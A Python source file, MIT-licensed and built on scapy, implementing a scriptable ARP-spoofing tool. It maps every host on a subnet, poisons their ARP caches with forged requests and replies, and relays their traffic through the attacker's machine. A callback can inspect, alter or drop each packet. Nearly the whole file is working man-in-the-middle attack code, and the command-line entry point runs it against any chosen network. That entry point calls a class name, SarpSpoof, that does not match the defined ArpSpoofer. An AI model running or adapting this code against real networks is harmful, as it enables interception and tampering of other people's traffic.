"""
MIT License

Copyright (c) 2018 Jacob Hartman

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""

import sys
import threading 
import time
import copy

from scapy.all import *
import ipaddress

def is_python_2():
    return sys.version_info[0] == 2


if is_python_2():
    import Queue as queue
else:
    import queue


class SniffThread (threading.Thread):
    def __init__(self, interface, out_queue, filter=""):
        threading.Thread.__init__(self)
        self._queue = out_queue
        self._filter = filter
        self._interface = interface
        self.daemon = True
        self._stop = False
        

    def sniff(self, pkt):
        self._queue.put(pkt)

    def is_stopping(self, pkt):
        return self._stop

    def run(self):
        sniff(prn=self.sniff, store=0, iface=self._interface, filter=self._filter, stop_filter=self.is_stopping)
        print("done")

    def stop_sniffing(self):
        self._stop = True

class ArpRequestPoisoner(threading.Thread):
    def __init__(self, mac, interface, ip_map, free_ip, incr=2):
        threading.Thread.__init__(self)
        self.daemon = True
        self._mac = mac
        self._interface = interface
        self._ip_map = ip_map
        self._incr = incr
        self._running = True
        self._free_ip = free_ip

    def stop_poison(self):
        self._running = False

    def run(self):
        # Poisoning
        while self._running:
            for ip in self._ip_map:
                arp_frame = Ether(dst="ff:ff:ff:ff:ff:ff", src=self._mac, type=0x806)/ARP(op=1, hwsrc=self._mac, pdst=self._free_ip, psrc=ip)
                sendp(arp_frame, iface=self._interface, verbose=0)
            time.sleep(self._incr)
        print("ArpRequestPoisoner stopped, re-arping...")

        # Re-arping clients
        for i in range(3):
            for ip in self._ip_map:
                arp_frame = Ether(dst="ff:ff:ff:ff:ff:ff", src=self._ip_map[ip], type=0x806)/ARP(op=1, hwsrc=self._ip_map[ip], pdst=self._free_ip, psrc=ip)
                sendp(arp_frame, iface=self._interface, verbose=0)
            time.sleep(self._incr)

        for i in range(3):
            for ip in self._ip_map:
                arp_frame = Ether(dst="ff:ff:ff:ff:ff:ff", src=self._mac, type=0x806)/ARP(op=1, hwsrc=self._mac, pdst=ip, psrc=self._free_ip)
                sendp(arp_frame, iface=self._interface, verbose=0)
            time.sleep(self._incr)

class ArpResponsePoisoner(threading.Thread):
    def __init__(self, mac, interface, ip_map, incr=2):
        threading.Thread.__init__(self)
        self.daemon = True
        self._mac = mac
        self._interface = interface
        self._ip_map = ip_map
        self._incr = incr
        self._running = True

    def stop_poison(self):
        self._running = False

    def run(self):
        # Poisoning
        while self._running:
            for sender_ip in self._ip_map:
                for resp_ip in self._ip_map:
                    arp_frame = Ether(
                        dst=self._ip_map[sender_ip], 
                        src=self._mac, 
                        type=0x806)/ARP(
                        op=2, 
                        pdst=sender_ip, 
                        hwdst=self._ip_map[sender_ip], 
                        psrc=resp_ip,
                        hwsrc=self._mac)
                    sendp(arp_frame, iface=self._interface, verbose=0)
            time.sleep(self._incr)
        print("ArpResponsePoisoner stopped, re-arping...")

        # Re-arping clients
        for i in range(3):
            for sender_ip in self._ip_map:
                for resp_ip in self._ip_map:
                    arp_frame = Ether(
                        dst=self._ip_map[sender_ip], 
                        src=self._ip_map[resp_ip], 
                        type=0x806)/ARP(
                        op=2, 
                        pdst=sender_ip, 
                        hwdst=self._ip_map[sender_ip], 
                        psrc=resp_ip,
                        hwsrc=self._ip_map[resp_ip])
                    sendp(arp_frame, iface=self._interface, verbose=0)
            time.sleep(self._incr)

class PacketIntercept(threading.Thread):
    def __init__(self, mac_address, ip_address, interface, ip_map, on_packet):
        threading.Thread.__init__(self)
        self._on_packet = on_packet 
        self._mac = mac_address
        self._interface = interface
        self._ip_map = ip_map
        self._ip = ip_address
        self._running = True
        self._pkt_queue = queue.Queue()

    def stop_processing(self):
        self._running = False
        self._pkt_queue.put(None)

    def run(self):
        on_packet_sniff = SniffThread(self._interface, self._pkt_queue, "not arp and not host " + str(self._ip) + " and ether host " + self._mac)
        on_packet_sniff.start()

        while self._running:
            pkt = self._pkt_queue.get()
            if pkt and Ether in pkt and pkt.dst == self._mac and pkt.src != self._mac:
                if self._on_packet:
                    send_pkt = self._on_packet(copy.deepcopy(pkt))
                else:
                    send_pkt = pkt
                # False means to drop the packet
                if send_pkt:
                    if Ether in send_pkt and IP in send_pkt and send_pkt[IP].dst in self._ip_map:
                        send_ip = send_pkt[IP].dst
                        send_pkt[Ether].dst = self._ip_map[send_ip]
                        send_pkt[Ether].src = self._mac
                        sendp(send_pkt, iface=self._interface, verbose=0)
    
        on_packet_sniff.stop_sniffing()

class ArpSpoofer():

    def __init__(self, network_address, interface, mac_address, ip_address):
        if is_python_2():
            self._network_address = ipaddress.ip_network(unicode(network_address))
        else:
            self._network_address = ipaddress.ip_network(network_address)

        if is_python_2():
            self._ip = ipaddress.ip_address(unicode(ip_address))
        else:
            self._ip = ipaddress.ip_address(ip_address)

        self._interface = interface
        self._mac = mac_address
        self._on_intercept = None
        self._mac_map = {}
        self._ip_map = {}

        self._pkt_queue = None
        self._running = True

        self._resp_poison = None
        self._req_poison = None

    def set_intercept(self, intercept_func):
        self._on_intercept = intercept_func

    def start_spoof(self, on_packet=None):
        print("Building IP to MAC address map...")
        arp_queue = queue.Queue()
        arp_resp_sniff = SniffThread(self._interface, arp_queue, "arp")
        arp_resp_sniff.start()

        time.sleep(0.5)

        all_hosts = []

        for host in self._network_address.hosts():
            if host == self._ip:
                print("! - Skipping self at " + str(self._ip))
                continue
            arp_frame = Ether(dst="ff:ff:ff:ff:ff:ff", src=self._mac, type=0x806)/ARP(op=1, pdst=str(host), psrc=str(self._ip))
            sendp(arp_frame, iface=self._interface, verbose=0)
            all_hosts.append(host)

        time.sleep(1)
        arp_resp_sniff.stop_sniffing()
        
        while not arp_queue.empty():
            resp = arp_queue.get()
            if ARP in resp and resp[ARP].op == 2:
                self._mac_map[resp[ARP].hwsrc] = resp[ARP].psrc
                self._ip_map[resp[ARP].psrc] = resp[ARP].hwsrc

        free_ip = all_hosts[len(all_hosts)-1]

        for host in self._network_address.hosts():
            if str(host) not in self._ip_map:
                free_ip = str(host)
                break

        print("Mapping complete...")
        self._req_poison = ArpRequestPoisoner(self._mac, self._interface, self._ip_map, free_ip)
        self._req_poison.start()

        self._resp_poison = ArpResponsePoisoner(self._mac, self._interface, self._ip_map)
        self._resp_poison.start()

        print("Intercepting packets...")
        self._intecept = PacketIntercept(self._mac, self._ip, self._interface, self._ip_map, on_packet)
        self._intecept.start()
            
            
                

            
    def stop_spoof(self):
        

        print("Re-arping clients")

        if self._resp_poison:
            self._resp_poison.stop_poison()
            self._resp_poison.join()

        if self._req_poison:
            self._req_poison.stop_poison()
            self._req_poison.join()

        print("Stopping intercept...")
        if self._intecept:
            self._intecept.stop_processing()
            self._intecept.join()



if __name__ == '__main__':
    import argparse
    import signal 

    parser = argparse.ArgumentParser(description='Scriptable ARP Spoofing')
    parser.add_argument('--network_address', '-n', help='The network address')
    parser.add_argument('--interface', '-i', help='The interface to use')
    parser.add_argument('--mac', '-m', help='The MAC to spoof (usually our MAC)')
    parser.add_argument('--ip', '-p', help='The IP to use (usually our IP)')

    args = parser.parse_args()

    if args.network_address == None:
        print("No network set")
        sys.exit(1)

    if args.interface == None:
        print("No interface set")
        sys.exit(1)

    if args.mac == None:
        print("No mac set")
        sys.exit(1)

    if args.ip == None:
        print("No ip set")
        sys.exit(1)

    spoofer = SarpSpoof(args.network_address, args.interface, args.mac, args.ip)

    def signal_handler(signal, frame):
        print("")
        spoofer.stop_spoof()
        sys.exit(1)
        

        
    signal.signal(signal.SIGINT, signal_handler)

    def print_pkt(pkt):
        pkt.show()
        return pkt

    spoofer.start_spoof(on_packet=print_pkt)

    while True:
        time.sleep(3)

    